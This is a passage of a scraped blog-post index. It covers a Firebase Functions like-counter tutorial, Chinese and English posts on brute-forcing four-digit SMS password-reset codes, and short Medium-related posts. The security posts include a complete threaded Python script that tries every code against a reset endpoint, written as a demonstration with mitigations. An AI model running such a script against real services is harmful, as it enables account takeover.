express();admin.initializeApp();app.use(cors({ origin: true }));// Like Postapp.post(\"/like/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection('posts').doc(req.params.id).set({likeCount: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});exports.post= functions.https.onRequest(app);運用 increment 這個變數就能直接做到取出值 +1 的動作。大流量文章按讚計數器因為 Firestore 有 寫入速度限制 的：一個文檔一秒只能寫入一次 ，所以當按讚的人一多；同時請求下可能會變得很慢。官方給的解決方法「 Distributed counters 」其實也沒什麼高深的技術，就是多用幾個分散的 likeCount 欄位來統計，然後讀取的時候再加總起來。index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Distributed counters Like Postapp.post(\"/like2/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } //1~10 await admin.firestore().collection('posts').doc(req.params.id).collection(\"likeCounter\").doc(\"likeCount_\"+(Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});exports.post= functions.https.onRequest(app);以上就是分散出欄位來紀錄 Count 避免寫入太慢；但如果分散的欄位太多會增加讀取成本($$)，但應該還是比每次按讚都 add 一筆新紀錄還便宜。使用 Siege 工具進行壓力測試使用 brew 安裝 siegebrew install siegep.s 如果你出現 brew: command not found 請先安裝 brew 套件管理工具 ：/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"安裝完成後可下：siege -c 100 -r 1 -H 'Content-Type: application/json' 'https://us-central1-project.cloudfunctions.net/post/like/id POST {}'進行壓力測試： -c 100 ：100 個任務同步執行 -r 1 ：每個任務執行 1 次請求 -H ‘Content-Type: application/json’ ：如果是 POST 時需加上 ‘https://us-central1-project.cloudfunctions.net/post/like/id POST {}’ ：POST 網址、Post Body (ex: {“name”:”1234”} )執行完成後可看到執行結果：successful_transactions: 100 表示 100 次都執行成功。可以回 Firebase -&gt; Firestore 查看結果是否有 Loss Data： 成功！完整 Example Codeindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Insertapp.post('/', async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author, \"created_at\": new Date()}; await admin.firestore().collection('posts').add(post); res.status(201).send({\"message\":\"新增成功！\"});});// Updateapp.put(\"/:id\", async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } else if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author}; await admin.firestore().collection('posts').doc(req.params.id).update(post); res.status(200).send({\"message\":\"修改成功！\"});});// Deleteapp.delete(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection(\"posts\").doc(req.params.id).delete(); res.status(200).send({\"message\":\"文章成功！\"});});// Select Listapp.get('/', async (req, res) =&gt; { const posts = await admin.firestore().collection('posts').get(); var result = []; posts.forEach(doc =&gt; { let id = doc.id; let data = doc.data(); result.push({\"id\":id, ...data}) }); res.status(200).send({\"result\":result});});// Select Oneapp.get(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } res.status(200).send({\"result\":{\"id\":doc.id, ...doc.data()}});});// InsertOrUpdateapp.post(\"/tag\", async (req, res) =&gt; { const name = req.body.name; if (name == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var tag = {\"name\":name}; await admin.firestore().collection('tags').doc(name).set({created_at: new Date()}, {merge: true}); res.status(201).send({\"message\":\"新增成功！\"});});// Like Postapp.post(\"/like/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection('posts').doc(req.params.id).set({likeCount: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});// Distributed counters Like Postapp.post(\"/like2/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } //1~10 await admin.firestore().collection('posts').doc(req.params.id).collection(\"likeCounter\").doc(\"likeCount_\"+(Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});exports.post= functions.https.onRequest(app);回歸主題，推播統計回到一開始我們想做的，推播統計功能。index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));const vaildPlatformTypes = [\"iOS\",\"Android\"]const vaildActionTypes = [\"clicked\",\"received\"]// Insert Logapp.post('/', async (req, res) =&gt; { const increment = admin.firestore.FieldValue.increment(1); const platformType = req.body.platformType; const pushID = req.body.pushID; const actionType = req.body.actionType; if (!vaildPlatformTypes.includes(platformType) || pushID == undefined || !vaildActionTypes.includes(actionType)) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } else { await admin.firestore().collection(platformType).doc(actionType+\"_\"+pushID).collection(\"shards\").doc((Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}) res.status(201).send({\"message\":\"紀錄成功！\"}); }});// View Logapp.get('/:type/:id', async (req, res) =&gt; { // received const receivedDocs = await admin.firestore().collection(req.params.type).doc(\"received_\"+req.params.id).collection(\"shards\").get(); var received = 0; receivedDocs.forEach(doc =&gt; { received += doc.data().count; }); // clicked const clickedDocs = await admin.firestore().collection(req.params.type).doc(\"clicked_\"+req.params.id).collection(\"shards\").get(); var clicked = 0; clickedDocs.forEach(doc =&gt; { clicked += doc.data().count; }); res.status(200).send({\"received\":received,\"clicked\":clicked});});exports.notification = functions.https.onRequest(app);新增推播紀錄檢視推播統計數字https://us-centra1-xxx.cloudfunctions.net/notification/iOS/1另外也做了個介面統計推播數字。踩坑 因為對 node.js 用法不太熟悉，一開始摸索的時候在 add 資料時沒加上 await 再加上寫入速度限制，導致在大流量情況下會 Data Loss…Pricing別忘了參考 Firebase Functions &amp; Firestore 的定價策略。Functions https://cloud.google.com/functions/pricing?hl=zh-tw運算時間網路 Cloud Functions 針對運算時間資源提供永久免費方案，當中包含 GB/秒和 GHz/秒的運算時間。除了 200 萬次叫用以外，免費方案也提供 400,000 GB/秒和 200,000 GHz/秒的運算時間，以及每月 5 GB 的網際網路輸出流量。Firestore https://cloud.google.com/firestore/pricing?hl=zh-tw 計算範例 價格可能隨時更改，請以官網最新資訊為準。結論如同標題所寫「可供測試」、「可供測試」、「可供測試」不太建議將以上服務用於正式環境，甚至當作產品的核心上線。收費貴、難遷移之前曾聽說某個蠻大的服務就是使用 Firebase 服務搭建起家，結果後期資料、流量大，收費爆貴；要轉移也很困難，程式還好但資料非常難搬；只能說是初期省了小錢卻造成後期巨大的虧損，不值得。僅供測試因為以上原因，使用 Firebase Functions + Firestore 搭建的 API 服務個人建議僅供測試或是 Prototype 產品展示。更多功能Functions 還可以串 Authentication(身份驗證)、Storage(檔案上傳)，但這部分我就沒研究了。參考資料 https://firebase.google.com/docs/firestore/query-data/queries https://coder.tw/?p=7198 https://firebase.google.com/docs/firestore/solutions/counters#node.js_1 https://javascript.plainenglish.io/firebase-cloud-functions-tutorial-creating-a-rest-api-8cbc51479f80延伸閱讀 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 i OS ≥ 10 Notification Service Extension 應用 (Swift) 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 3,293 Total Views Last Statistics Date: 2025-08-15 | 3,221 Views on Medium." }, { "title": "找回密碼之簡訊驗證碼強度安全問題", "url": "/posts/zrealm-dev/%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A2%BC%E4%B9%8B%E7%B0%A1%E8%A8%8A%E9%A9%97%E8%AD%89%E7%A2%BC%E5%BC%B7%E5%BA%A6%E5%AE%89%E5%85%A8%E5%95%8F%E9%A1%8C-99a6cef90190/", "categories": "ZRealm Dev.", "tags": "ios-app-development, hacker, web-security, password-security, security-token", "date": "2021-03-14 23:57:38 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.找回密碼之簡訊驗證碼強度安全問題使用 Python 展示暴力破解的嚴重性Photo by Matt Artz前言本文沒什麼資安技術含量，單純是日前在使用某平台網站時的突發奇想；想說順手測看看安全性，結果發現的問題。在使用網站、...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.找回密碼之簡訊驗證碼強度安全問題使用 Python 展示暴力破解的嚴重性Photo by Matt Artz前言本文沒什麼資安技術含量，單純是日前在使用某平台網站時的突發奇想；想說順手測看看安全性，結果發現的問題。在使用網站、APP 服務的忘記密碼找回功能時；一般會有兩個選項，一是輸入帳號、Email，然後會寄含有 Token 的重設密碼頁面連結到信箱，點擊後打開頁面就能重設密碼，這部分沒什麼問題，除非像 之前那篇 文章所說，設計上有漏洞才會有問題。另一個找回密碼的方式是輸入綁定的手機號碼（多半用在 APP 服務），然後會寄出簡訊驗證碼到手機，完成驗證碼輸入即可重設密碼；但為了便利性，多半的服務都是使用純數字作為驗證碼，另外也因為在 iOS ≥ 11 之後增加 Password AutoFill 功能，當手機收到驗證碼後鍵盤會自動判讀並跳出提示。查找 官方文件 ，蘋果並沒有給出驗證碼自動填入的判讀格式規則；但我看幾乎所有能支援自動填入的服務都是使用純數字，推測應該是只能用數字不能使用數字英文夾雜的複雜組合。問題因數字密碼的組合存在暴力破解的可能性，尤其是 4 位密碼；組合只有 0000~9999，10,000 種組合；使用多個 thread 多台機器就能分組暴力破解。假設驗證請求需要 0.1 秒回應，10,000 個組合 = 10,000 次請求破解所需嘗試時間：((10,000 * 0.1) / thread 數) 秒就算不開 thread 也只需要 16 多分種就能嘗試出正確的簡訊驗證碼。 除密碼長度、複雜度不足之外，還有個問題是驗證碼未設嘗試上限、有效期限太長這兩個問題。組合綜合上述，此資安問題常見於 APP 端；因網頁服務多半都會在嘗試錯誤多次後加上圖形驗證碼驗證或在請求重設密碼時需多輸入安全問題，增加發送驗證請求的困難度；另外網頁服務的驗證若沒有前後端分離，變成每次驗證請求都要拿整個網頁，拉長請求回應時間。APP 端因流程設計及方便使用者，多半會簡化重設密碼流程、有的 APP 甚至是通過手機號碼驗證就能登入；如果在 API 端沒有做防護則會造成資安漏洞。實踐 ⚠️警告⚠️ 本文僅作展示此安全問題的嚴重性，請勿拿去做壞事。嗅探驗證請求 API萬事都從嗅探開始，這部分可參考之前的文章「 APP有用HTTPS傳輸，但資料還是被偷了。 」、「 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 」第一篇文章看原理建議使用第二篇文章的 Proxyman 進行嗅探。如果是前後端分離的網站服務也能使用 Chrome -&gt; 檢查 -&gt; Network -&gt; 查看在送出驗證碼後發了什麼請求。這邊假設得到的檢查驗證碼請求是：POST https://zhgchg.li/findPWDResponse：{ \"status\":fasle \"msg\":\"驗證錯誤\"}撰寫暴力破解 Python 腳本crack.py:import randomimport requestsimport jsonimport threadingphone = \"0911111111\"found = Falsedef crack(start, end): global found for code in range(start, end): if found: break stringCode = str(code).zfill(4) data = { \"phone\" : phone, \"code\": stringCode } headers = {} try: request = requests.post('https://zhgchg.li/findPWD', data = data, headers = headers) result = json.loads(request.content) if result[\"status\"] == True: print(\"Code is:\" + stringCode) found = True break else: print(\"Code \" + stringCode + \" is wrong.\") except Exception as e: print(\"Code \"+ stringCode +\" exception error \\(\" + str(e) + \")\")def main(): codeGroups = [ [0,1000],[1000,2000],[2000,3000],[3000,4000],[4000,5000], [5000,6000],[6000,7000],[7000,8000],[8000,9000],[9000,10000] ] for codeGroup in codeGroups: t = threading.Thread(target = crack, args = (codeGroup[0],codeGroup[1],)) t.start()main()執行腳本後我們得到：驗證碼等於：1743將 1743 帶入重設密碼更改掉原始密碼或直接登入帳號。 Bigo!解決之道 密碼重設增加更多資訊驗證（如：生日、安全問題） 增加驗證碼長度（如 Apple 6 碼數字）、增加驗證碼複雜度（如果不影響 AutoFill 功能） 驗證碼嘗試錯誤大於 3 次後使其失效，需請使用者重新發送驗證碼 驗證碼有效時限縮短 驗證碼嘗試錯誤過多次鎖定裝置、增加圖形驗證碼 APP 多做 SSL Pining、傳輸加解密（防止嗅探）延伸閱讀 揭露一個幾年前發現的巧妙網站漏洞 如何打造一場有趣的工程CTF競賽 APP有用HTTPS傳輸，但資料還是被偷了。 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,343 Total Views Last Statistics Date: 2025-08-15 | 1,304 Views on Medium." }, { "title": "Security Issues with SMS Verification Code Strength in Password Recovery", "url": "/posts/zrealm-dev/en/security-issues-with-sms-verification-code-strength-in-password-recovery-99a6cef90190/", "categories": "ZRealm Dev.", "tags": "ios-app-development, hacker, web-security, password-security, security-token", "date": "2021-03-14 23:57:38 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Security Issues with SMS Verification Code Strength in Password RecoveryDemonstratin...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Security Issues with SMS Verification Code Strength in Password RecoveryDemonstrating the severity of brute force attacks using PythonPhoto by Matt ArtzIntroductionThis article does not contain much technical content related to cybersecurity; it simply stems from a recent thought while using a certain platform’s website. I wanted to test its security and discovered some issues.When using the password recovery feature on websites or apps, there are generally two options: one is to enter the account or email, after which a link containing a token to reset the password is sent to the email. Clicking the link opens the page to reset the password, which is usually not problematic unless there are design flaws as mentioned in a previous article.The other method for password recovery is to enter the bound mobile phone number (mostly used in app services), after which an SMS verification code is sent to the phone. Once the code is entered, the password can be reset. However, for convenience, most services use purely numeric codes. Additionally, since iOS ≥ 11 introduced the Password AutoFill feature, when the phone receives the verification code, the keyboard automatically detects it and prompts the user.According to the official documentation, Apple has not provided specific format rules for automatic code filling. However, I have observed that almost all services that support auto-fill use purely numeric codes, suggesting that only numbers are allowed and complex combinations of numbers and letters are not permitted.IssuesDue to the potential for brute force attacks on numeric passwords, especially with 4-digit codes, there are only 10,000 combinations from 0000 to 9999. Using multiple threads and machines, one can perform a distributed brute force attack.Assuming a response time of 0.1 seconds per verification request, for 10,000 combinations, the calculation is as follows:Time required for cracking attempts: ((10,000 * 0.1) / number of threads) secondsEven without using threads, it would only take a little over 16 minutes to try all possible SMS verification codes. In addition to insufficient password length and complexity, there are two other issues: the lack of a limit on the number of attempts for the verification code and the excessively long validity period of the code.SummaryIn summary, this cybersecurity issue is commonly found on the app side; web services typically implement measures such as CAPTCHA after multiple failed attempts or require additional security questions when requesting a password reset, making it more difficult to send verification requests. Additionally, if the web service does not separate the front and back end, each verification request may require loading the entire webpage, increasing response times.On the app side, due to process design and user convenience, the password reset process is often simplified. Some apps even allow login through mobile number verification. If there are no protections on the API side, this can lead to security vulnerabilities.Implementation ⚠️ Warning ⚠️ This article is solely for demonstrating the severity of this security issue; please do not use this information for malicious purposes.Sniffing Verification Request APIEverything starts with sniffing. For this part, you can refer to previous articles like “Apps use HTTPS for transmission, but data is still stolen.” and “Using Python + Google Cloud Platform + Line Bot to automate routine tasks”. I recommend using the Proxyman tool for sniffing.If it is a front-end and back-end separated web service, you can also use Chrome -&gt; Inspect -&gt; Network to see what requests are sent after submitting the verification code.Assuming the verification request received is:POST https://zhgchg.li/findPWDResponse:{ \"status\": false, \"msg\": \"Verification error\"}Writing a Brute Force Python Scriptcrack.py:import randomimport requestsimport jsonimport threadingphone = \"0911111111\"found = Falsedef crack(start, end): global found for code in range(start, end): if found: break stringCode = str(code).zfill(4) data = { \"phone\": phone, \"code\": stringCode } headers = {} try: request = requests.post('https://zhgchg.li/findPWD', data=data, headers=headers) result = json.loads(request.content) if result[\"status\"] == True: print(\"Code is:\" + stringCode) found = True break else: print(\"Code \" + stringCode + \" is wrong.\") except Exception as e: print(\"Code \" + stringCode + \" exception error (\" + str(e) + \")\")def main(): codeGroups = [ [0, 1000], [1000, 2000], [2000, 3000], [3000, 4000], [4000, 5000], [5000, 6000], [6000, 7000], [7000, 8000], [8000, 9000], [9000, 10000] ] for codeGroup in codeGroups: t = threading.Thread(target=crack, args=(codeGroup[0], codeGroup[1],)) t.start()main()After running the script, we obtain:Verification code equals: 1743Using 1743, we can reset the password or directly log into the account. Bingo!Solutions Increase the amount of information required for password resets (e.g., birthday, security questions) Increase the length of the verification code (e.g., Apple’s 6-digit codes) and enhance code complexity (if it does not affect AutoFill functionality) Make the verification code invalid after more than 3 incorrect attempts, requiring the user to request a new code Shorten the validity period of the verification code Lock the device after too many incorrect attempts and implement CAPTCHA Implement SSL Pinning and encryption for data transmission in apps (to prevent sniffing)Further Reading Exposing a clever website vulnerability discovered a few years ago How to create an engaging engineering CTF competition Apps use HTTPS for transmission, but data is still stolen. Using Python + Google Cloud Platform + Line Bot to automate routine tasksIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,343 Total Views Last Statistics Date: 2025-08-15 | 1,304 Views on Medium." }, { "title": "Bye Bye 2020 經營 Medium 第二年回顧", "url": "/posts/zrealm-life/bye-bye-2020-%E7%B6%93%E7%87%9F-medium-%E7%AC%AC%E4%BA%8C%E5%B9%B4%E5%9B%9E%E9%A1%A7-5ea3311119d8/", "categories": "ZRealm Life.", "tags": "生活, ｍedium, blog, ios, taiwan", "date": "2021-02-24 20:59:41 +0800", "snippet": "Bye Bye 2020 經營 Medium 第二年回顧遲到遲到再遲到的 2020 回顧圖片取自 2020 年擔任 iOS Developer 的服務單位 — 街聲 — 簡單生活節官方海報 2018–2019 第一年的回顧在這。艱難的一年無關工作，2020 對我來說是艱難的一年；經歷了許多重大挫折，不過還好，都挺過去了。我只想說一句： 人，要學會珍惜當下、珍惜自己所擁有的。工作回到工作上...", "content": "Bye Bye 2020 經營 Medium 第二年回顧遲到遲到再遲到的 2020 回顧圖片取自 2020 年擔任 iOS Developer 的服務單位 — 街聲 — 簡單生活節官方海報 2018–2019 第一年的回顧在這。艱難的一年無關工作，2020 對我來說是艱難的一年；經歷了許多重大挫折，不過還好，都挺過去了。我只想說一句： 人，要學會珍惜當下、珍惜自己所擁有的。工作回到工作上，2020 突破舒適圈進入新的環境；讓我接觸到許多新鮮事，吸收了很多 iOS 、工程開發上的精華，雖然 2020 的產文量不如之前、還曾經停止更新了三四個月；但重質不重量，2020 撰寫的文章雖少但表現其實都比之前的好；慢慢有在進步！另外去年也用 Google site 把個人網站弄起來了；並持續會把 Medium 新文章消息同步過去。zhgchg.li初衷我還是那個我，我是很懶的人；不會為了寫文章而寫，每篇文章都是自己醞釀了些心得然後立刻下筆記錄下來的歷程，如果發懶沒有一口氣做這件事，我應該也懶得回頭寫了（不過這多半是不重要、不有趣的議題我才會這樣）。缺點就是有時候一頭熱，寫太快，打錯字是小如果內容有錯或不夠完整誤導大家真是罪孽 Orz；所以今年在寫文章時會把能想到、能處理的問題都一並研究處理，就算我當初專案上沒有用到；就算不能處理也留下個訊息提醒讀者還有這個方面要注意。寫文章用到的 Chrome Extension 再推一次 Code Medium 這個 ，可以直接在 Medium 之中使用 Gist 貼上漂亮的程式碼！安裝好之後，在 Medium 上點「+」然後選最後一個「&lt;&gt;」這時畫面會分為左右，可以直接在右方輸入程式碼：送出之後就會直接以 gist 嵌入 Medium 文章中：使用 gist 嵌入程式碼的好處是，支援彩色高亮，方便讀者閱讀；壞處是如果想把 Medium 轉成 markdown 格式時，無法自動將嵌入的程式碼一起轉換，要自己手動 Copy &amp; Paste。 - 試過很多轉換工具都不支援 gist 擷取，如果有朋友知道懇請補充。 - Medium 內建的程式碼區塊到現在都還不支援彩色高亮顯示，所以只能這樣。 Medium Next Generation Stats ：加強 Medium 後台統計數據顯示每日流量聚合顯示，一眼就能看出今天的流量文章組成。另外還有統計新增的追蹤者、拍手…等等功能。今年目標備份計畫除了繼續寫作外；預計會找個時間把每篇文章都翻成 Markdown 版本並上傳到 Github 進行備份，防止哪一天 Medium 突然爆炸…，目前是使用 Typora 這個編輯器；蠻好用的，之後再來介紹！Typora目前進度大約完成 15%，因為很無聊所以有點懶 哈哈。 Medium 官方的備份下載只有備份純文字，圖片都還是外連沒有下載回來；更何況程式碼的部分都是內嵌，不能直接在 Markdown 顯示。獨立網域已經部署上去了，請參考「 Medium 自訂網域功能回歸 」。 Profile 頁： blog.zhgchg.li （我是只用子網域 blog.zhgchg.li ，因為主網域有其他用途）但發現會影響 Google SEO，還在考慮＆測試要不要真的使用。Buy Me A Coffee！最近也開通了以下服務： Buy Me A Coffee 讚賞公民反正我很閒統計最後還是要來個統計！2020 年一共發表了：16 篇文章： 3 篇生活 + 2 篇開箱 + 11 篇技術文章全站累積至 2021/02/24 ： 所有文章瀏覽次數： 180, 000 次（成長 2倍） 所有文章拍手總計： 1,1000 次（成長 1 倍） 追蹤者：突破 400 位（成長 1 倍）表現比較好的文章有： iOS UIViewController 轉場二三事 iOS 逆向工程初體驗 iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 Apple Watch Series 6 開箱 &amp; 兩年使用體驗 使用 iPhone 簡單製作「偽」透視透明手機桌布 2020 一樣感謝大家的支持與愛護，今年也會繼續加油的！ 你的回饋就是我寫作的原動力！ZhgChgLi, 2021/02/24.有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 231 Total Views Last Statistics Date: 2025-08-15 | 208 Views on Medium." }, { "title": "Medium 自訂網域功能回歸", "url": "/posts/zrealm-life/medium-%E8%87%AA%E8%A8%82%E7%B6%B2%E5%9F%9F%E5%8A%9F%E8%83%BD%E5%9B%9E%E6%AD%B8-d9a95d4224ea/", "categories": "ZRealm Life.", "tags": "medium, 生活, domain-names, domain-authority, domain-registration", "date": "2021-02-24 02:25:15 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Medium 自訂網域功能回歸自己的 Domain Authority 自己養！[2024/07/28] 功能回歸Setting up a custom domain for your profile or publicati...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Medium 自訂網域功能回歸自己的 Domain Authority 自己養！[2024/07/28] 功能回歸Setting up a custom domain for your profile or publication一波三折，此功能在 2012 年開放過，後來又關閉；在 2021 年重新開放，2022 年又宣布關閉；最近 2024 年再回來看發現官方又重新開放了，並且更新了完整的設定步驟文件，可參考最新的官方文件進行設定， 網域註冊流程教學再參考本文內容 。 Setting up a custom domain for your profile or publication 大家可趁開放的時候趕快設定使用，不知道官方哪一天又想關閉；已設定的自訂網域不受影響。 我 2021 就設定了 https://blog.zhgchg.li 中間官方關閉自訂網域功能，但依然有效，至今也都能正常使用Breaking News!Medium 官方部落格於 2021/02/17 發布最新消息，Medium 又能重新讓創作者綁定自己的網域（Domain）啦！不論事創作者 Profile 頁或是 Publications 都支援設定。什麼是「自訂網域」為了怕讀者不一定都是資訊領域出生，這邊簡單說明一下什麼是自訂網域。網域（Domain）如同網路世界的門牌，我輸入門牌 Medium.com 就會到 Medium；如今開放讓創作者自訂網域，也就是自訂門牌，你可以註冊好自己想要的門牌，然後綁定到 Medium…This post is behind Medium’s paywall, View the full post on Medium, converted by ZMediumToMarkdown.本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,972 Total Views Last Statistics Date: 2025-08-15 | 1,863 Views on Medium." }, { "title": "Medium Custom Domain Feature Returns", "url": "/posts/zrealm-life/en/medium-custom-domain-feature-returns-d9a95d4224ea/", "categories": "ZRealm Life.", "tags": "medium, lifestyle, domain-names, domain-authority, domain-registration", "date": "2021-02-24 02:25:15 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Medium Custom Domain Feature ReturnsCultivating Your Own Domain Authority![2024/07/2...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Medium Custom Domain Feature ReturnsCultivating Your Own Domain Authority![2024/07/28] Feature ReturnsSetting up a custom domain for your profile or publicationThis feature has had a tumultuous history. It was first introduced in 2012, then discontinued; reopened in 2021, only to be announced as closed again in 2022. Recently, in 2024, it has returned once more, and the official documentation has been updated with complete setup instructions. You can refer to the latest official documents for guidance, and for more on the domain registration process, check out this article here. Setting up a custom domain for your profile or publication Everyone should take advantage of this opportunity to set up their custom domains while they can; we never know when the feature might be closed again. Existing custom domains will remain unaffected. I set up my custom domain at https://blog.zhgchg.li back in 2021, even during the time when the official feature was closed, and it has continued to work perfectly since.Breaking News!On February 17, 2021, Medium’s official blog announced that creators can once again link their own domains! This feature supports both creator profiles and publications.What is a “Custom Domain”?To ensure that all readers, regardless of their background, understand, let’s briefly explain what a custom domain is.A domain is like an address in the online world. When I enter the address Medium.com, I arrive at Medium. Now, with the option for creators to set a custom domain, it means you can choose your own address. You can register the address you want and link it to Medium…This post is behind Medium’s paywall. View the full post on Medium, converted by ZMediumToMarkdown.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,972 Total Views Last Statistics Date: 2025-08-15 | 1,863 Views on Medium." }, { "title": "揭露一個幾年前發現的巧妙網站漏洞", "url": "/posts/zrealm-dev/%E6%8F%AD%E9%9C%B2%E4%B8%80%E5%80%8B%E5%B9%BE%E5%B9%B4%E5%89%8D%E7%99%BC%E7%8F%BE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%B6%B2%E7%AB%99%E6%BC%8F%E6%B4%9E-142244e5f07a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, hacker, web-security, website-security-test, capture-the-flag", "date": "2021-02-22 21:27:06 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.揭露一個幾年前發現的巧妙網站漏洞多個漏洞合併引起的網站資安問題Photo by Tarik Haiga前言幾年前還有在邊支援網頁開發的時候；被指派任務要為公司內部工程組舉辦 CTF 競賽；一開始初想是依照公司產品分組互相攻防入...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.揭露一個幾年前發現的巧妙網站漏洞多個漏洞合併引起的網站資安問題Photo by Tarik Haiga前言幾年前還有在邊支援網頁開發的時候；被指派任務要為公司內部工程組舉辦 CTF 競賽；一開始初想是依照公司產品分組互相攻防入侵，但身為主辦，為了想先瞭解掌握程度就先對公司旗下各產品進行入侵測試；看看我自己能找到幾個漏洞，確保活動流程不會出問題。 但最後因為比賽時間有限、工程區別差異太大；所以最後以工程共通基礎知識及有趣的方向出題，有興趣的朋友可參考我之前的文章「 如何打造一場有趣的工程CTF競賽 」；裡面有很多腦洞大開的題目！找到的漏洞一共在三個產品中找到四個漏洞，除了本文準備提及的問題之外還有以下三個常見網站漏洞被我發現： Never Trust The Client! 問題很入門，就是前端直接將 ID 送給後端，而且後端還直接認了；這邊應該要改成認 Token。 重設密碼設計缺陷 實際有點忘了，只記得是程式設計有缺陷；導致重設密碼步驟可以繞過信箱驗證。 XSS 問題 本文將介紹的漏洞查找方式一律以黑箱測試，其中只有發現 XSS 問題的產品是我有參與過程式開發，其他都沒有也沒看過程式碼。漏洞現況身為白帽駭客，所有找到的問題都已在第一時間回報工程團隊和修復了；目前也過了兩年，想想是時候可以公開了；但顧及前公司立場，本文不會提到是哪個產品出現此漏洞，大家就只要參考這個漏洞發現的歷程及原因就好！漏洞後果此漏洞可讓入侵者隨意變更目標使用者密碼，並使用新密碼登入目標使用者帳號，盜取個人資料、從事非法操作。漏洞主因如同標題所述，此漏洞是由多個原因組合觸發；包含以下因素： 帳號登入未支援兩階段驗證、設備綁定 重設密碼驗證使用流水號 網站資料加密功能存在解密漏洞 加解密功能濫用 驗證令牌設計錯誤 後端未二次驗證欄位正確性 平台上使用者信箱為公開資訊漏洞重現方式因平台上使用者信箱為公開資訊，所以我們先在平台上瀏覽目標入侵帳號；知道信箱後前往重設密碼頁。 